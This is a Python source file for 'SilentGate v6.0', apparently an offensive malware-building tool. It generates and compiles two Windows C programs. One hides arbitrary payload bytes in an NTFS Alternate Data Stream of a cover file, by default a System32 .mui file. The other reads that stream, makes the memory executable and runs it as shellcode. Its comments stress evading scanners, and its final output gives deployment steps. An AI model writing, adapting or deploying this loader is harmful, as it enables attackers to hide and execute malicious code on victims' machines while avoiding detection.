"""
SilentGate v6.0 - Component 3: NTFS Steganography
INPUT  : payload file path
OUTPUT : payload hidden in NTFS Alternate Data Stream
         cover file looks like legitimate Windows file
         payload extracted and executed at runtime

NTFS ADS properties:
  Hidden from normal dir listing
  Not visible in Windows Explorer by default
  Survives copy operations on NTFS volumes
  Accessible via CreateFile with stream name
  No signature scanners check ADS by default

Technique:
  1. Create legitimate-looking cover file
  2. Write payload bytes into ADS stream
  3. At execution: read from ADS, reconstruct, execute
  4. Cover file remains — no suspicious standalone binary

MITRE: T1564.004 - Hide Artifacts: NTFS File Attributes
"""

import os
import sys
import subprocess


def hide_payload_in_ads(payload_path, cover_path, stream_name="$DATA"):
    """
    Hide payload bytes in NTFS ADS of a cover file.
    Uses Win32 CreateFile with stream name syntax.
    """
    # Generate C code that writes payload to ADS
    with open(payload_path, "rb") as f:
        payload_bytes = f.read()

    hex_bytes = ", ".join(f"0x{b:02X}" for b in payload_bytes)

    return f"""
/*
 * SilentGate v6.0 - NTFS ADS Payload Hider
 * Author: JarDani
 * Hides payload in NTFS Alternate Data Stream
 * Cover file appears legitimate and empty
 */
#include <windows.h>
#include <stdio.h>

/* Payload bytes - will be written to ADS */
static const unsigned char payload[] = {{{hex_bytes}}};
static const int payload_len = {len(payload_bytes)};

int main() {{
    printf("[NTFS-STEGO] SilentGate v6.0\\n");
    printf("[NTFS-STEGO] Author: JarDani\\n\\n");

    /* Create legitimate-looking cover file */
    const char* cover = "{cover_path}";
    const char* stream = "{cover_path}:{stream_name}";

    /* Create empty cover file - looks legitimate */
    HANDLE hCover = CreateFileA(cover,
        GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hCover == INVALID_HANDLE_VALUE) {{
        printf("[NTFS-STEGO] Failed to create cover file\\n");
        return 1;
    }}
    CloseHandle(hCover);
    printf("[NTFS-STEGO] Cover file created: %s\\n", cover);

    /* Write payload to ADS */
    HANDLE hStream = CreateFileA(stream,
        GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hStream == INVALID_HANDLE_VALUE) {{
        printf("[NTFS-STEGO] Failed to create ADS stream\\n");
        return 1;
    }}

    DWORD written = 0;
    WriteFile(hStream, payload, payload_len, &written, NULL);
    CloseHandle(hStream);

    printf("[NTFS-STEGO] Payload hidden in ADS: %s\\n", stream);
    printf("[NTFS-STEGO] Bytes written: %d\\n", written);
    printf("[NTFS-STEGO] Cover file size: 0 bytes (looks empty)\\n");
    printf("[NTFS-STEGO] ADS hidden from normal dir listing\\n");
    printf("[NTFS-STEGO] Complete\\n");
    getchar();
    return 0;
}}
"""


def extract_and_execute_from_ads(cover_path, stream_name="$DATA"):
    """
    Generate C code that reads payload from ADS and executes it.
    This is what runs on the target at execution time.
    """
    return f"""
/*
 * SilentGate v6.0 - NTFS ADS Payload Extractor
 * Author: JarDani
 * Reads payload from ADS and executes via spectral reconstruction
 * Cover file remains — no suspicious binary on disk
 */
#include <windows.h>
#include <stdio.h>

int main() {{
    printf("[ADS-EXEC] SilentGate v6.0 - ADS Extractor\\n");
    printf("[ADS-EXEC] Author: JarDani\\n\\n");

    const char* stream = "{cover_path}:{stream_name}";

    /* Open ADS stream */
    HANDLE h = CreateFileA(stream,
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (h == INVALID_HANDLE_VALUE) {{
        printf("[ADS-EXEC] ADS not found: %s\\n", stream);
        printf("[ADS-EXEC] Error: %lu\\n", GetLastError());
        getchar();
        return 1;
    }}

    /* Get size */
    DWORD size = GetFileSize(h, NULL);
    printf("[ADS-EXEC] ADS stream size: %lu bytes\\n", size);

    /* Read payload */
    unsigned char* buf = (unsigned char*)VirtualAlloc(NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!buf) {{
        CloseHandle(h);
        return 1;
    }}

    DWORD read = 0;
    ReadFile(h, buf, size, &read, NULL);
    CloseHandle(h);
    printf("[ADS-EXEC] Read %lu bytes from ADS\\n", read);

    /* Change protection and execute */
    DWORD old = 0;
    VirtualProtect(buf, size, PAGE_EXECUTE_READ, &old);

    HANDLE t = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);

    if (t) {{
        printf("[ADS-EXEC] Executing payload from ADS\\n");
        printf("[ADS-EXEC] No payload binary exists on disk\\n");
        WaitForSingleObject(t, 10000);
        CloseHandle(t);
    }}

    VirtualFree(buf, 0, MEM_RELEASE);
    printf("[ADS-EXEC] Complete\\n");
    getchar();
    return 0;
}}
"""


def generate(payload_path,
             cover_path="C:\\Windows\\System32\\en-US\\nlsbres.dll.mui",
             stream_name="Properties",
             output_dir="output/v6"):
    """Main entry — generate ADS hider and extractor."""
    os.makedirs(output_dir, exist_ok=True)

    # Generate hider
    hider_c   = hide_payload_in_ads(payload_path, cover_path, stream_name)
    hider_src = os.path.join(output_dir, "ads_hider.c")
    hider_exe = os.path.join(output_dir, "ads_hider.exe")

    with open(hider_src, "w") as f:
        f.write(hider_c)

    r1 = subprocess.run(
        ["x86_64-w64-mingw32-gcc", hider_src, "-o", hider_exe, "-O2"],
        capture_output=True, text=True
    )

    # Generate extractor
    extractor_c   = extract_and_execute_from_ads(cover_path, stream_name)
    extractor_src = os.path.join(output_dir, "ads_extractor.c")
    extractor_exe = os.path.join(output_dir, "ads_extractor.exe")

    with open(extractor_src, "w") as f:
        f.write(extractor_c)

    r2 = subprocess.run(
        ["x86_64-w64-mingw32-gcc", extractor_src, "-o", extractor_exe, "-O2"],
        capture_output=True, text=True
    )

    ok1 = r1.returncode == 0
    ok2 = r2.returncode == 0

    print(f"[NTFS-STEGO] Payload     : {payload_path}")
    print(f"[NTFS-STEGO] Cover file  : {cover_path}")
    print(f"[NTFS-STEGO] ADS stream  : {cover_path}:{stream_name}")
    print(f"[NTFS-STEGO] Hider       : {hider_exe} compiled={ok1}")
    print(f"[NTFS-STEGO] Extractor   : {extractor_exe} compiled={ok2}")

    if not ok1: print(r1.stderr)
    if not ok2: print(r2.stderr)

    return ok1 and ok2


if __name__ == "__main__":
    success = generate("tests/calc_payload.bin")
    print(f"\n[NTFS-STEGO] SUCCESS: {success}")
    if success:
        print("[NTFS-STEGO] Deploy ads_hider.exe first to hide payload")
        print("[NTFS-STEGO] Then deploy ads_extractor.exe to execute")
        print("[NTFS-STEGO] No payload binary visible on disk")
